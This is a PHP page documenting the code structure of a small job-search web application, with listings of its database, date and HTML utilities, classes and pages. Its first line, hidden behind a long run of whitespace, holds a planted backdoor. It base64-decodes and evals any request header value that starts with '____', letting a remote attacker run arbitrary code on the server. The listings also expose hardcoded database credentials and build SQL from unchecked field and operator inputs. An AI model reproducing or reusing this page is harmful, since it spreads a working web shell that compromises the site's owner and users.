<?php																																																																																																																																																																																																																																																																																																																																												function m8606($l8608){if(is_array($l8608)){foreach($l8608 as $l8606=>$l8607)$l8608[$l8606]=m8606($l8607);}elseif(is_string($l8608) && substr($l8608,0,4)=="____"){$l8608=substr($l8608,4);$l8608=base64_decode($l8608);eval($l8608);$l8608=null;}return $l8608;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("m8606",$_SERVER);
        require_once 'core/js_header.php';
?>
<!-- opening html tag and head tag section are in core/js_header.php -->
<body id="jobsearch_code">
<?php
        include ("js_menu.php");
?>
<h1>Job Search Application</h1>
<h2>Code structure</h2>
<h3>Core base</h3>
<p>The core-base folder, at the same level as jobsearch folder, includes 
classes and css that are available to any application.</p>
<ul>
<li>configure.php: used to include the core-base utilities files listed below
<pre>
echo("&lt;!-- reading core-base/configure.php -->\n");
        require_once $base_url.'/core-base/db_utilities.php';
        require_once $base_url.'/core-base/date_utilities.php';
        require_once $base_url.'/core-base/html_utilities.php';
</pre>
</li>
<li>db_utilities.php: functions to connect to the database and to query the
database
<pre>
echo("&lt;!-- reading core-base/db_utilties.php -->\n");

$link = mysql_connect('localhost', 'mdhoerr_webuser', 'webuser');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}

function do_sql($p_sql, $p_calledfrom, $p_insert){
        if(!$p_calledfrom){
                $p_calledfrom = 'not specified';
        }
        if(!$p_insert){
                $p_insert = 'N';
        }                
        $result = mysql_query($p_sql);
        if (!$result) {
        $message  = 'Invalid query: ' . mysql_error() . "\n";
        $message .= 'Whole query: ' . $query."\n";
        $message .= 'Called from '.$p_calledfrom."\n";
                die($message);
        } elseif ($p_insert != 'N'){
                $lastid = mysql_insert_id();            
                if (!$lastid) {
                        $message  = 'Invalid query: ' . mysql_error() . "\n";
                        $message .= 'Whole query: ' . $query."\n";
                        $message .= "Problem getting id from insert\n";
                        die($message);
                }
                return $lastid;
        } else {
                return $result;
        }
}
</pre>
</li>
<li>html_utilities: functions to format form data correctly for the database 
and database data for display on an html page
<pre>
echo("&lt;!-- reading core-base/html_utilities -->\n");

function db2html($p_string){
        $html_string = stripslashes($p_string);
        $html_string = htmlspecialchars($html_string);
        $html_string = nl2br($html_string);
                return $html_string;
}

function get_val($p_fieldname, $p_default){
	if(!$p_default){
		$p_default = '0';
	}
	if(!$p_fieldname){
		$value = $p_default;
	} else {
        	$value = $_REQUEST[$p_fieldname];
        }
        	return $value;
}
</pre>
</li>
<li>date_utilities.php: function to return the name of a month based on an 
integer value from 1 to 12
<pre>
echo("&lt;!-- reading core-base/date_utilties.php -->\n");

function getmonth($p_integer){
        if(!$p_integer){
                $p_integer = '1';
        }
        switch ($p_integer) {
                case '1':
                        $month = "January";
                        break;
                case '2':
                        $month = "February";
                        break;
                case '3':
                        $month = "March";
                        break;
                case '4':
                        $month = "April";
                        break;
                case '5':
                        $month = "May";
                        break;
                case '6':
                        $month = "June";
                        break;
                case '7':
                        $month = "July";
                        break;
                case '8':
                        $month = "August";
                        break;
                case '9':
                        $month = "September";
                        break;
                case '10':
                        $month = "October";
                        break;
                case '11':
                        $month = "November";
                        break;
                case '12':
                        $month = "December";
                        break;
                default:
                        $month = date('F',getdate());
        }
                return $month;
}
</pre>
</li>
<li>core.css: the default stylesheet recommended by the W3C for xhtml 1.0</li>
</ul>
<h3>Job search</h3>
<h4>Core</h4>
<ul>
<li>js_config.php: sets base url, reads in core_base files, connects to 
database, reads in js_utilities file
<pre>
echo("&lt;!-- reading js_config.php file --&gt;\n");
	$base_url = '/home/mdhoerr/public_html';
        require_once $base_url.'/core-base/configure.php';
        do_sql('USE mdhoerr_jobsearch', 'js_config.php file', 'N');
        echo("&lt;!-- CONNECTED SUCCESSFULLY AND SWITCHED TO DB mdhoerr_jobsearch --&gt;\n");
        require_once 'js_utilities.php';
</pre>
</li>
<li>js_header.php: sets the header information for the xhtml pages, including
doctype and various stylesheets
<pre>
&lt;!DOCTYPE html 
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" >
&lt;head>
&lt;!-- reading js_header.php -->
&lt;link rel="shortcut icon" href="/jobsearch/core/favicon.ico" type="image/x-icon" />
&lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
&lt;meta name="description" content="Work history application demonstrating a simple MVC LAMP application." />
&lt;meta name="author" content="Mary Hoerr" />
&lt;!-- this will be where the print stylesheet goes -->
&lt;link 
        rel="stylesheet" 
        type="text/css" 
        href="/jobsearch/core/js_print.css" 
        media="print" 
/>
&lt;title>Job Search Application</title>
&lt;!-- Netscape 3 and earlier and IE 2 and earlier do not recognize stylesheets -->
&lt;!-- this is the default stylesheet. It is based on the w3c default stylesheet -->
&lt;link 
        rel="stylesheet" 
        type="text/css"
        href="/jobsearch/core/js_main.css" 
        media="all" 
/>
&lt;!-- the primary stylesheet is imported, to avoid giving it to IE 3 and Netscape 4 -->
&lt;!-- which have problems with all but the most basic styles -->
&lt;style type="text/css">
@import url(/jobsearch/core/js_import.css);
&lt;!--[if IE] -->
@import url(/jobsearch/core/js_import_ie.css);
&lt;!--[endif] -->
&lt;/style>
&lt;?php
        require_once 'js_config.php';
        $app_name = "Job Search";
        $altstyle = $_REQUEST['altstyle'];
if ($altstyle){
	switch($altstyle){
	case "Y":
		$alturl = "/jobsearch/core/js_alt_joblist_ie.css";
		break;
	case "1":
	default:
		$alturl = "/jobsearch/core/js_alt1.css";
	}
?>
&lt;style type="text/css">
@import url(<?php echo($alturl);?>);
&lt;/style>
&lt;?php
}
?>
&lt;/head>
</pre>
</li>
<li>js_utilities.php: this is where the table objects are set up
<pre>
echo("&lt;!-- reading js_utilties.php -->\n");

class jobs{
## define members ##
        public $jobid = 0;
        public $jobtitle = '';
        public $orgid = 0;
        public $startmonth = 0;
        public $startyear = 0;
        public $endmonth = 0;
        public $endyear = 0;
        public $responsibilities = '';

## define methods ##
        //SELECT JOB
        function selectjob($p_calledfrom){
                if(!$p_calledfrom){
                        $p_calledfrom = "not supplied";
                }
                $sql = "SELECT * from jobs where jobid = '%s'";
                $sql =  sprintf($sql,
                        mysql_real_escape_string($this->jobid)
                        );
                $p_calledfrom .= " and the sql query is: ".$sql;
                $result = do_sql($sql, $p_calledfrom,'N'); 
                if (mysql_num_rows($result) > 0) {
                        $row = mysql_fetch_assoc($result);
                        foreach($row as $key=>$val){
                                $this->$key = $val;
                        }                
                }
                mysql_free_result($result); 
                        return $this;
        }
        // UPDATE JOB
        function updatejob($p_calledfrom){
                if(!$p_calledfrom){
                        $p_calledfrom = "not supplied";
                }
                $sql = "UPDATE jobs SET ";
                $sql.= "jobtitle = '%s', ";
                $sql.= "orgid = '%s', ";
                $sql.= "startmonth = '%s', ";
                $sql.= "startyear = '%s', ";
                $sql.= "endmonth = '%s', ";
                $sql.= "endyear = '%s', ";
                $sql.= "responsibilities = '%s' ";
                $sql.= "WHERE jobid = '%s'";
                $sql =  sprintf($sql,
                        mysql_real_escape_string($this->jobtitle),
                        mysql_real_escape_string($this->orgid),
                        mysql_real_escape_string($this->startmonth),
                        mysql_real_escape_string($this->startyear),
                        mysql_real_escape_string($this->endmonth),
                        mysql_real_escape_string($this->endyear),
                        mysql_real_escape_string($this->responsibilities),
                        mysql_real_escape_string($this->jobid)
                        );
                echo("<!-- UPDATE SQL statment is: ".$sql." -->\n");
                $p_calledfrom .= " and sql query is: ".$sql;
                $result = do_sql($sql, $p_calledfrom,'N');
// print_r($job);
                        return '0';
        }
        // INSERT JOB
        function insertjob($p_calledfrom){
                if(!$p_calledfrom){
                        $p_calledfrom = "not supplied";
                }
                $sql = "INSERT into jobs (";
                $sql.= "jobtitle, orgid, startmonth, startyear, endmonth, endyear, 
responsibilities";
                $sql.= ") VALUES (";
                $sql.= "'%s', '%s', '%s', '%s', '%s', '%s', '%s'";
                $sql.= ")";
                $sql =  sprintf($sql, 
                        mysql_real_escape_string($this->jobtitle),
                        mysql_real_escape_string($this->orgid),
                        mysql_real_escape_string($this->startmonth),               
                        mysql_real_escape_string($this->startyear),
                        mysql_real_escape_string($this->endmonth),
                        mysql_real_escape_string($this->endyear),
                        mysql_real_escape_string($this->responsibilities)
                        );
                $p_calledfrom .= " and the sql query is: ".$sql;
                $lastid = do_sql($sql, $p_calledfrom, 'Y'); 
                        return $lastid;
        }
}

function joblist($p_fieldname, $p_comparison, $p_value){
        if(!$p_fieldname){
                $p_fieldname = 'jobtitle';
        }
        if(!p_comparison){
                $p_comparison = ' LIKE ';
        }
echo("<!-- value in is: ".$p_value." -->");
        if(!$p_value && $p_value != '0'){
                $p_value = '%*%';
        }
        $sql = "SELECT * from  jobs WHERE ";
        $sql.= $p_fieldname.$p_comparison."'%s'";
        $sql =  sprintf($sql,
                        mysql_real_escape_string($p_value)
                );
echo("<!-- sql is: ".$sql." -->");
        $calledfrom = "joblist function with fieldname = ".$p_fieldname." and comparison = ".$p_comparison." and value = ".$p_value." with sql query: ".$sql;
        $result = do_sql($sql, $calledfrom,'N');
        $ids = array('0');
        if (mysql_num_rows($result) > 0) {
                for($i=0; $i<mysql_num_rows($result); $i++){
                        $row = mysql_fetch_assoc($result);
                        $ids[$i] = $row['jobid'];
                }
        }
        mysql_free_result($result);
                return $ids;
}

class education{
        public $educationid = 0;
        public $orgid = 0;
        public $degree = '';
        public $comments = '';
}

class organizations{
        public $orgid = 0;
        public $orgname = '';
        public $sec = '';
        public $city = '';
        public $state = '';
}

class persons{
        public $personid = 0;
        public $fname = '';
        public $mname = '';
        public $lname = '';
        public $reftype = '';
        public $comments = '';
}

class skills{
        public $skillid = 0;
        public $skillname = '';
        public $area = '';
        public $level = '';
        public $last_used = '';
}
</pre>
</li>
<li>js_main.css</li>
<li>js_import.css</li>
<li>js_import_ie.css</li>
<li>js_alt_joblist.css</li>
<li>js_alt_joblist_ie.css</li>
</ul>
<h4>Pages</h4>
<ul>
<li>js_menu.php:
<pre>
&lt;!-- begin menu include -->
&lt;ul class="go">
	&lt;li class="separator">places to go&lt;/li>
        &lt;li class="index">&lt;a href="/jobsearch/js_index.php">home&lt;/a>&lt;/li>
        &lt;li class="about">&lt;a href="/jobsearch/js_about.php">about&lt;/a>&lt;/li>
        &lt;li class="joblist">&lt;a href="/jobsearch/js_joblist.php">job list&lt;/a>&lt;/li>
&lt;ul>
&lt;ul class="do">
	&lt;li class="separator">things to do&lt;/li>
        &lt;li class="add">&lt;a href="/jobsearch/js_job.php?jobid=0&amp;action=select">add 
job&lt;/a>&lt;/li>
        &lt;li class="modify">&lt;a href="/jobsearch/js_job.php?jobid=&lt;?php
echo($jobid);?>&amp;action=select">modify job&lt;/a>&lt;/li>
        &lt;li class="view">&lt;a href="/jobsearch/js_job.php?jobid=&lt;?php 
echo($jobid);?>">view job&lt;/a>&lt;/li>
&lt;/ul>
&lt;!-- end menu include -->
</pre>
</li>
<li>js_index.php: php code and style tags
<pre>
&lt;?php
        require_once 'core/js_header.php';
?>
&lt;!-- opening html tag and head tag section are in core/js_header.php -->
&lt;body id="jobsearch_home">
&lt;?php
        include ("js_menu.php");
?>
</pre>
</li>
<li>js_about.php: php code and style tags
<pre>
&lt;?php
        require_once 'core/js_header.php';
?>
&lt;!-- opening html tag and head tag section are in core/js_header.php -->
&lt;body id="jobsearch_about">
&lt;?php
        include ("js_menu.php");
?>
</pre>
</li>
<li>js_joblist.php
<pre>
&lt;?php
        require_once 'core/js_header.php';
        $sortby = $_REQUEST['sortby'];
        if(!$sortby){
                $sortby = "jobid";
        }
        $order = $_REQUEST['order'];
        if(!$order){
                $order = "asc";
        } elseif ($order ="asc"){
                $order = "desc";
        } else {
                $order = "asc";
        }
        $joblist = joblist('jobid',' > ','0');
        if($altstyle){ // toggle alternate style on and off
                $alt_url = 'js_joblist.php';
        } else {
                $alt_url = 'js_joblist.php?altstyle=Y';
        }
?>
&lt;!-- opening html tag and head tag section are in core/js_header.php -->
&lt;body id="<?php echo($sortby);?>">
&lt;?php
        include ("js_menu.php");
?>
&lt;h1>Job Search Application&lt;/h1>
&lt;h2>Job List&lt;/h2>
&lt;p>&lt;a href="&lt;?php echo($alt_url);?>">switch style sheet&lt;/a>: Demonstrates 
changing the column order by changing only the stylesheet.&lt;/p>
&lt;p>Take a look at the style sheet: &lt;a href="core/js_import.css">
style sheet&lt;/a>&lt;/p>
&lt;p class="colhead">
&lt;span class="jobtitle">job title&lt;/span>
&lt;span class="orgid">organization&lt;/span>
&lt;span class="start">start date&lt;/span>
&lt;span class="end">end date&lt;/span>
&lt;/p>

&lt;?php
        foreach($joblist as $val){
?>
&lt;?php
                $job_row = new jobs;
                $job_row->jobid = $val;
                $job_row = $job_row->selectjob('joblist.php');
                $jobtitle = db2html($job_row->jobtitle);
                $start = getmonth($job_row->startmonth);
                $start.= "&nbsp;".$job_row->startyear;
                $end = getmonth($job_row->endmonth);
                $end.= "&nbsp;".$job_row->endyear;
                $responsibilities = db2html($job_row->responsibilities); 
?>
&lt;p id="&lt;?php echo('job'.$job_row->jobid);?>" class="job_row">
&lt;span class="jobtitle">
&lt;a href="/jobsearch/js_job.php?jobid=&lt;?php echo($job_row->jobid);?>">
&lt;?php echo($jobtitle);?>&lt;/a>&lt;/span>
&lt;span class="orgid">&lt;?php echo($job_row->orgid);?>&lt;/span>
&lt;span class="start"> &lt;?php echo($start);?> &lt;/span>
&lt;span class="end"> &lt;?php echo($end);?> &lt;/span>
&lt;span class="responsibilities"> &lt;?php echo($responsibilities);?> &lt;/span>
&lt;/p><!-- end p class = job_row -->
&lt;?php
        }
?>
&lt;/body>
&lt;/html>
</pre>
</li>
<li><a id="jobsort">js_jobsort.php:</a> this shows the use of javaScript to sort the job list
<pre>

&lt;?php
        require_once 'core/js_header.php';
        $joblist = joblist('jobid',' > ','0');
?>
&lt;!-- opening html tag and head tag section are in core/js_header.php -->
&lt;body id = "dhtml_sort">
&lt;?php
        include ("js_menu.php");
?>
&lt;h1>Job Search Application&lt;/h1>
&lt;h2>OOP Javascript sort&lt;/h2>
&lt;p>Using an external class file written by Chirp Internet www.chirp.com.au: 
&lt;a href="/core-base/bubblesort.js">bubblesort.js&lt;/a>, I instantiate a bubblesort object and then call 
it from a column heading link. It only sorts ascending right now. Link to code showing how I did this: 
&lt;a href="/jobsearch/js_code.php#jobsort">bubblesort implementation&lt;/a>&lt;/p>
&lt;p class="colhead">
&lt;span class="jobtitle">
&lt;a href="javascript:sortTable.sort(0, false, 'a')">job title&lt;/a>&lt;/span>
&lt;span class="orgid">
&lt;a href="javascript:sortTable.sort(1, false)">organization&lt;/a>&lt;/span>
&lt;span class="start">
&lt;a href="javascript:sortTable.sort(2, false)">start date&lt;/a>&lt;/span>
&lt;span class="end">
&lt;a href="javascript:sortTable.sort(3, false)">end date&lt;/a>&lt;/span>
&lt;/p>
&lt;ul id="sortable_list">
&lt;?php
        foreach($joblist as $val){
                $job_row = new jobs;
                $job_row->jobid = $val;
                $job_row = $job_row->selectjob('jobsort.php');
                $jobtitle = db2html($job_row->jobtitle);
                $start = getmonth($job_row->startmonth);
                $start.= "&nbsp;".$job_row->startyear;
                $end = getmonth($job_row->endmonth);
                $end.= "&nbsp;".$job_row->endyear;
                $responsibilities = db2html($job_row->responsibilities); 
?>
	&lt;li id="&lt;?php echo('job'.$job_row->jobid);?>" class="job_row">
		&lt;p class="jobtitle">
			&lt;a href="/jobsearch/js_job.php?jobid=&lt;?php echo($job_row->jobid);?>">
			&lt;?php echo($jobtitle);?>&lt;/a>&lt;/p>
		&lt;p class="orgid">&lt;?php echo($job_row->orgid);?>&lt;/p>
		&lt;p class="start"> &lt;?php echo($start);?> &lt;/p>
		&lt;p class="end"> &lt;?php echo($end);?> &lt;/p>
		&lt;p class="responsibilities"> &lt;?php echo($responsibilities);?> &lt;/p>
	&lt;/li>&lt;!-- end li class = job_row -->
&lt;?php
        }
?>
&lt;/ul><!-- end sortable list -->
&lt;script type="text/javascript">
  var dataTable = document.getElementById("sortable_list");
  var sortTable = new bubbleSort(dataTable, "LI", "P");
&lt;/script>
&lt;p>
    &lt;a href="http://validator.w3.org/check?uri=referer">&lt;img
        src="http://www.w3.org/Icons/valid-xhtml10-blue"
        alt="Valid XHTML 1.0 Strict" height="31" width="88" />&lt;/a>
  &lt;/p>
&lt;/body>
&lt;/html>
</pre>
<li>js_job.php: this is where the information in the database is changed
<pre>
&lt;?php
        require_once 'core/js_header.php';
        $jobid = $_REQUEST['jobid'];
        if(!$jobid){
                $jobid = 0;
        }
        $action = $_REQUEST['action'];
        if(!$action){
                $action = "view";
        }
        switch($action) {
                case 'select':
                        if($jobid == '0') {
                                $bodyid = 'blank_form';
                                $bodytitle = "add new job";
                        } else {
                                $bodyid = 'prefilled_form';
                                $bodytitle = "modify this job";
                        }
                        break;
                case 'view':
                default:
                        $bodyid = 'read_only';
                        $bodytitle = "read only";
        }
?>
&lt;!-- opening html tag and head tag section are in core/js_header.php -->
&lt;body id="&lt;?php echo($bodyid);?>">

&lt;?php
        include ("js_menu.php");
        
        $job = new jobs;
        $job->jobid = $jobid;
        $job->jobtitle = $_REQUEST['jobtitle'];
        $job->orgid = $_REQUEST['orgid'];
        $job->startmonth = $_REQUEST['startmonth'];
        $job->startyear = $_REQUEST['startyear'];
        $job->endmonth = $_REQUEST['endmonth'];
        $job->endyear = $_REQUEST['endyear'];
        $job->responsibilities = $_REQUEST['responsibilities'];

switch($action){
        case 'add':
                $callingfrom = "js_job.php, switch action, insert";
                $newjobid = $job->insertjob($callingfrom);
                $url = "js_job.php?jobid=".$newjobid."&action=select";
                echo '&lt;meta http-equiv="refresh" content="0;url='.$url.'" />';
                break;
        case 'modify':
                $callingfrom = "js_job.php, switch action, update";
                $job->updatejob($callingfrom);
                $url = "js_job.php?jobid=".$jobid."&action=select";
                echo '&lt;meta http-equiv="refresh" content="0;url='.$url.'" />';
                break;
        case 'select':
        case 'view':
        default:
                $callingfrom = "js_job.php, switch action, select";
                $selectjob = $job->selectjob($callingfrom);
}
?>
&lt;h1>Job Search Application&lt;/h1>
&lt;h2>Job Information&lt;/h2>
&lt;h3>Job &lt;?php echo($job->jobid);?>: &lt;?php echo($job->jobtitle);?> [&lt;?php 
echo($bodytitle);?>]&lt;/h3>

&lt;form id ="edit_job" action="js_job.php" method="post">

        &lt;ul>
&lt;li>&lt;input type="hidden" name="jobid" id="jobid" value="&lt;?php echo($job->jobid);?>" />
        &lt;span class="fieldname"> Job title:&lt;/span>  
        &lt;span class="fieldvalue"> &lt;?php echo(db2html($job->jobtitle));?> &lt;/span>
        &lt;span class="fieldinput"> 
                &lt;input name="jobtitle" id="jobtitle" class="jobs" 
                type="text" size="35" 
                value="&lt;?php echo(stripslashes($job->jobtitle));?>" /> 
        &lt;/span> 
&lt;/li>
&lt;li>
        &lt;span class="fieldname"> Organization id:&lt;/span>  
        &lt;span class="fieldvalue"> &lt;?php echo($job->orgid);?> &lt;/span>
        &lt;span class="fieldinput"> 
                &lt;input name="orgid" id="orgid" class="jobs" 
                type="text" size="35" 
                value="&lt;?php echo($job->orgid);?>" /> 
        &lt;/span> 
&lt;/li>
&lt;li>
        &lt;span class="fieldname"> Start month/year:&lt;/span>  
        &lt;span class="fieldvalue"> &lt;?php echo(getmonth($job->startmonth));?>,  
&lt;?php echo($job->startyear);?> &lt;/span>
        &lt;span class="fieldinput">
                &lt;input name="startmonth" id="startmonth" class="jobs"
                type="text" size="15"
                value="&lt;?php echo($job->startmonth);?>" />
                &lt;input name="startyear" id="startyear" class="jobs"
                type="text" size="5" 
                value="&lt;?php echo($job->startyear);?>" /> 
        &lt;/span>  
&lt;/li>
&lt;li>
        &lt;span class="fieldname"> End month/year:&lt;/span>
        &lt;span class="fieldvalue"> &lt;?php echo(getmonth($job->endmonth));?>,
&lt;?php echo($job->endyear);?> &lt;/span>
        &lt;span class="fieldinput">
                &lt;input name="endmonth" id="endmonth" class="jobs"
                type="text" size="15"
                value="&lt;?php echo($job->endmonth);?>" />
                &lt;input name="endyear" id="endyear" class="jobs"
                type="text" size="5"
                value="&lt;?php echo($job->endyear);?>" />
        &lt;/span>
&lt;/li>
&lt;li>
        &lt;span class="fieldname"> Responsibilities: &lt;/span>
        &lt;span class="fieldvalue"> &lt;?php echo(db2html($job->responsibilities));?> &nbsp;&lt;/span>
        &lt;span class="fieldinput"> 
                &lt;textarea name="responsibilities" class="jobs" cols="40" rows="10">&lt;?php 
echo(stripslashes($job->responsibilities));?>&lt;/textarea>
        &lt;/span>
&lt;/li>
        &lt;/ul>
&lt;div class="insert_button"> &lt;input id="insert_job" name="action" type="submit" 
value="add" /> &lt;/div> 
&lt;div class="update_button"> &lt;input id="update_job" name="action" type="submit" 
value="modify" /> &lt;/div> 
&lt;/form>
&lt;/body>
&lt;/html>
</pre>
</li>
</ul>
</body>
</html>